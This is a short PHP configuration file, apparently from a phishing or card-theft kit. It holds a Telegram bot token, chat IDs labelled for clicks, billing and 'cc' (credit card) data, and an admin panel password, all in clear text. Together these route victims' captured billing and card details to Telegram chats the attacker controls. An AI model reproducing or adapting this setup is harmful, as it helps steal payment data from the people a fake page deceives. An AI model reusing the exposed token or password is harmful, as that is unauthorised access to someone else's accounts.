<?php

declare(strict_types=1);

return [
    'bot_token' => '8810928681:AAGG3sOuN-wtBDJ9173vNoZciKDHoRoYnQM',

    'chat_id_clicks' => '-5551182488',
    'chat_id_billing' => '-5249535509',
    'chat_id_cc' => '-1004425004810',

    'panel_password' => 'ntm_charo_1212',

    'enabled' => true,
];
